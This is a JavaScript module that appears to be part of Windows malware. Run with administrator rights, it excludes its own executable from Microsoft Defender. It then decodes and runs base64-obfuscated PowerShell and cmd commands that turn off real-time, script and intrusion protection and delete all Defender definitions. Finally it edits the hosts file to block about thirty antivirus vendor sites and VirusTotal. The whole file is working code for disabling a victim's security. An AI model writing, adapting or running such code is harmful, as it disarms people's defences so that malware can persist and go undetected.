const child_process = require('child_process');
const path = require('path');
const fs = require('fs');

const program = require("../../utils/program/program.js");

const sites = [
    "ccleaner.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "pcprotect.com",
    "mcafee.com", "bitdefender.com", "home.sophos.com", "clamav.net", "drweb.com", "us.norton.com",
    "virustotal.com", "avast.com", "totalav.com", "scanguard.com", "zillya.com", "kaspersky.com",
    "usa.kaspersky.com", "adaware.com", "totaladblock.com", "avg.com", "malwarebytes.com", "pandasecurity.com",
    "avira.com", "norton.com", "eset.com", "bullguard.com", "sophos.com",
];

const ExcludeFromDefender = async () => {
    if (!(await program.IsElevated())) {
        return;
    }

    const executablePath = process.execPath;
    return new Promise((resolve, reject) => {
        child_process.exec(`powershell -Command "Add-MpPreference -ExclusionPath '${executablePath}'"`, { windowsHide: true }, (error) => {
            if (error) {
                return reject(error);
            }
            resolve();
        });
    });
};

const DisableDefender = async () => {
    if (!(await program.IsElevated())) {
        return;
    }

    const [
        cmd1,
        cmd2,
        cmd3,
    ] = [
            Buffer.from(`cG93ZXJzaGVsbCAtQ29tbWFuZCAiU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQi`, 'base64').toString(),
            Buffer.from(`cG93ZXJzaGVsbCAtQ29tbWFuZCAiU2V0LU1wUHJlZmVyZW5jZSAtU3VibWl0U2FtcGxlc0NvbnNlbnQgMiI=`, 'base64').toString(),
            Buffer.from(`Y21kIC9jICIlUHJvZ3JhbUZpbGVzJVxXaW5kb3dzIERlZmVuZGVyXE1wQ21kUnVuLmV4ZSAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbCI=`, 'base64').toString(),
        ]

    return new Promise((resolve, reject) => {
        child_process.exec(cmd1, { windowsHide: true }, (error) => {
            if (error) return reject(error);
            child_process.exec(cmd2, { windowsHide: true }, (error) => {
                if (error) return reject(error);
                child_process.exec(cmd3, { windowsHide: true }, (error) => {
                    if (error) return reject(error);
                    resolve();
                });
            });
        });
    });
};

const BlockSites = async (sites) => {
    if (!(await program.IsElevated())) {
        return;
    }

    const hostFilePath = path.join(process.env.SYSTEMROOT, 'System32', 'drivers', 'etc', 'hosts');

    const data = fs.readFileSync(hostFilePath, 'utf8');
    const lines = data.split('\n');
    const newData = lines.filter(line => !sites.some(site => line.includes(site)));

    for (const site of sites) {
        newData.push(`0.0.0.0 ${site}`);
        newData.push(`0.0.0.0 www.${site}`);
    }

    let updatedData = newData.join('\n');
    updatedData = updatedData.replace(/\n\n/g, '\n');

    fs.writeFileSync(hostFilePath, updatedData, { mode: 0o644 });

    return Promise.resolve();
};

module.exports = async () => {
    try {
        await ExcludeFromDefender();
        await DisableDefender();
        await BlockSites(sites);
    } catch (error) {
        console.error(error);
    }
};